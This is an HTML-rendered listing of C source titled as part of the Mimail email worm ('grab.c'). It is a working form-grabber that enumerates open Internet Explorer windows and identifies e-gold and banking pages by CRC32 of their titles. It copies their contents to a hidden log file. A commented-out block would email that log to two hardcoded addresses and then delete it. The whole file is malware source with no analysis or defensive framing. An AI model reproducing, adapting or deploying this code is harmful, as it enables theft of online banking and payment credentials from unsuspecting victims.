<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Mimail.a - grab.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/* need: crc32.c */</span><span class="sc0">

</span><span class="sc9">#include &lt;tchar.h&gt;
#include &lt;oleauto.h&gt;
#include &lt;shldisp.h&gt;
#include &lt;unknwn.h&gt;
#include &lt;exdisp.h&gt;
#define _WINGDI_ </span><span class="sc2">// to avoid warnings
</span><span class="sc9">#include &lt;mshtmlc.h&gt;
</span><span class="sc0">
</span><span class="sc9">#ifdef __LCC__
#pragma lib &lt;oleaut32.lib&gt;
#pragma lib &lt;ole32.lib&gt;
#pragma lib &lt;uuid.lib&gt;
#pragma lib &lt;shell32.lib&gt;
#endif
</span><span class="sc0">
</span><span class="sc9">#define GRAB_TIME 3*60*1000 </span><span class="sc1">/* msec */</span><span class="sc0">
</span><span class="sc9">#define LOGFILE_EGOLD "c:\\tmpe.tmp"
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">wide2char</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wide_str</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">char_str</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab_contens</span><span class="sc10">(</span><span class="sc11">IHTMLDocument2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pHtmlDoc</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab2</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab_for</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">store_str_egold</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">str</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_grab_info</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">finished</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwTimeStart</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">fBank</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">fBankFirstTime</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_grab_info</span><span class="sc0"> </span><span class="sc11">grab_info</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">LPTSTR</span><span class="sc0"> </span><span class="sc11">_stdcall</span><span class="sc0"> </span><span class="sc11">ErrorString</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">errno</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">

    </span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">TCHAR</span><span class="sc0"> </span><span class="sc11">szMsgBuf</span><span class="sc10">[</span><span class="sc4">0x1000</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">FormatMessage</span><span class="sc10">(</span><span class="sc11">FORMAT_MESSAGE_FROM_SYSTEM</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">errno</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAKELANGID</span><span class="sc10">(</span><span class="sc11">LANG_NEUTRAL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SUBLANG_DEFAULT</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">LPTSTR</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">szMsgBuf</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x1000</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">TCHAR</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">szMsgBuf</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#define THROW(r) \
    do { if ( FAILED((r)) ) \
       { printf("Line %d: %s\n", __LINE__,ErrorString((DWORD)(r))); grab_info.finished = TRUE; return 0; } \
       } while(0)
</span><span class="sc0">
</span><span class="sc9">#define THROW2(r) if(r==0){ printf("LINE %d\n",__LINE__); return 1; }
</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">CoInitialize</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">//crc32_init();
</span><span class="sc0">
    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">finished</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">dwTimeStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">fBank</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">while</span><span class="sc10">(!</span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">finished</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">GetTickCount</span><span class="sc10">()-</span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">dwTimeStart</span><span class="sc10">)&lt;</span><span class="sc11">GRAB_TIME</span><span class="sc10">)){</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">grab_for</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">buf2</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">store_str_egold</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//printf("%s\n",buf);
</span><span class="sc0">        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc4">4095</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">


    </span><span class="sc1">/* send file here */</span><span class="sc0">
    </span><span class="sc1">/*smtp_init();

    smtp_send_file(LOGFILE_EGOLD,"discoinferno@ehighway.org","discoinferno@ehighway.org","data");
    smtp_send_file(LOGFILE_EGOLD,"mymtu@centrum.cz","mymtu@centrum.cz","data");

    DeleteFile(LOGFILE_EGOLD);*/</span><span class="sc0">
    </span><span class="sc11">CoUninitialize</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab2</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">4096</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">fBankFirstTime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">fBank</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">finished</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">dwTimeStart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetTickCount</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc11">CoInitialize</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">buf2</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(!</span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">finished</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">GetTickCount</span><span class="sc10">()-</span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">dwTimeStart</span><span class="sc10">)&lt;</span><span class="sc11">GRAB_TIME</span><span class="sc10">)){</span><span class="sc0">
        </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">grab_for</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">Sleep</span><span class="sc10">(</span><span class="sc4">1000</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">buf2</span><span class="sc10">)!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">store_str_egold</span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//printf("%s\n",buf);
</span><span class="sc0">        </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">buf2</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc4">4095</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">


    </span><span class="sc11">CoUninitialize</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">   
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">grab_for</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">buf</span><span class="sc10">){</span><span class="sc0">

    </span><span class="sc11">HRESULT</span><span class="sc0"> </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">S_OK</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">IUnknown</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pIUnknown</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">IShellWindows</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pIShellWindows</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">CLSID</span><span class="sc0"> </span><span class="sc11">clsid</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CLSIDFromString</span><span class="sc10">(</span><span class="sc11">L</span><span class="sc6">"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">clsid</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">// ShellWindows
</span><span class="sc0">    </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CoCreateInstance</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc10">&amp;</span><span class="sc11">clsid</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">CLSCTX_LOCAL_SERVER</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">&amp;</span><span class="sc11">IID_IUnknown</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">pIUnknown</span><span class="sc0">
    </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// get IShellWindows interface
</span><span class="sc0">    </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIUnknown</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIUnknown</span><span class="sc10">-&gt;</span><span class="sc11">lpVtbl</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(</span><span class="sc11">pIUnknown</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">IID_IShellWindows</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">pIShellWindows</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">LONG</span><span class="sc0"> </span><span class="sc11">nCount</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIShellWindows</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIShellWindows</span><span class="sc10">-&gt;</span><span class="sc11">get_Count</span><span class="sc10">(&amp;</span><span class="sc11">nCount</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc2">//printf("Windows found: %d\n",nCount);
</span><span class="sc0">    </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc2">// ENUMERATE ALL WINDOWS
</span><span class="sc0">    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">nCount</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">++){</span><span class="sc0">

        </span><span class="sc11">IDispatch</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pIDisp</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_VARIANT</span><span class="sc0"> </span><span class="sc11">var_i</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">var_i</span><span class="sc10">.</span><span class="sc11">vt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">VT_I2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">var_i</span><span class="sc10">.</span><span class="sc11">intVal</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">a</span><span class="sc10">;</span><span class="sc0">

        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIShellWindows</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIShellWindows</span><span class="sc10">-&gt;</span><span class="sc11">Item</span><span class="sc10">(</span><span class="sc11">var_i</span><span class="sc10">,&amp;</span><span class="sc11">pIDisp</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">IWebBrowser2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pIE</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIDisp</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIDisp</span><span class="sc10">-&gt;</span><span class="sc11">lpVtbl</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(</span><span class="sc11">pIDisp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">IID_IWebBrowser2</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">pIE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">BSTR</span><span class="sc0"> </span><span class="sc11">bsUrl</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIE</span><span class="sc10">-&gt;</span><span class="sc11">get_LocationURL</span><span class="sc10">(&amp;</span><span class="sc11">bsUrl</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">CHAR</span><span class="sc0"> </span><span class="sc11">szUrl</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">wide2char</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">bsUrl</span><span class="sc10">,</span><span class="sc11">szUrl</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc2">//printf("URL: %s\n",szUrl);
</span><span class="sc0">
        </span><span class="sc11">IDispatch</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pIDisp2</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIE</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIE</span><span class="sc10">-&gt;</span><span class="sc11">get_Document</span><span class="sc10">(&amp;</span><span class="sc11">pIDisp2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">IHTMLDocument2</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pHtmlDoc</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pIDisp2</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pIDisp2</span><span class="sc10">-&gt;</span><span class="sc11">lpVtbl</span><span class="sc10">-&gt;</span><span class="sc11">QueryInterface</span><span class="sc10">(</span><span class="sc11">pIDisp2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">IID_IHTMLDocument2</span><span class="sc10">,(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">**)&amp;</span><span class="sc11">pHtmlDoc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc11">BSTR</span><span class="sc0"> </span><span class="sc11">bsTitle</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">CHAR</span><span class="sc0"> </span><span class="sc11">szTitle</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
        </span><span class="sc11">THROW2</span><span class="sc10">(</span><span class="sc11">pHtmlDoc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">hr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHtmlDoc</span><span class="sc10">-&gt;</span><span class="sc11">get_title</span><span class="sc10">(&amp;</span><span class="sc11">bsTitle</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">THROW</span><span class="sc10">(</span><span class="sc11">hr</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">wide2char</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">bsTitle</span><span class="sc10">,</span><span class="sc11">szTitle</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//printf("Title: %s\n",szTitle);
</span><span class="sc0">
            </span><span class="sc1">/* crc 32 of 'e-gold Account Access' is 0x90e38063 */</span><span class="sc0">
        </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ulTitleCrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">szTitle</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szTitle</span><span class="sc10">));</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">fBank</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">TRUE</span><span class="sc10">){</span><span class="sc0">
            </span><span class="sc1">/* grab online banking accounts */</span><span class="sc0">

            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">szTitle</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">ulBankCrc</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc2">// 0xD860BF7A = bank
</span><span class="sc0">            </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">szTitle</span><span class="sc10">)-</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++){</span><span class="sc0">
                </span><span class="sc11">p1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">ulBankCrc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">crc32</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">p1</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ulBankCrc</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0xD860BF7A</span><span class="sc10">){</span><span class="sc0">
                    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">fBankFirstTime</span><span class="sc10">){</span><span class="sc0">
                        </span><span class="sc11">grab_info</span><span class="sc10">.</span><span class="sc11">fBankFirstTime</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
                        </span><span class="sc11">store_str_egold</span><span class="sc10">(</span><span class="sc11">szTitle</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc11">store_str_egold</span><span class="sc10">(</span><span class="sc11">szUrl</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc10">}</span><span class="sc0">
                    </span><span class="sc11">grab_contens</span><span class="sc10">((</span><span class="sc11">IHTMLDocument2</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pHtmlDoc</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
                    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">ulTitleCrc</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0x90e38063</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">grab_contens</span><span class="sc10">((</span><span class="sc11">IHTMLDocument2</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">pHtmlDoc</span><span class="sc10">,</span><span class="sc11">buf</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">

    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

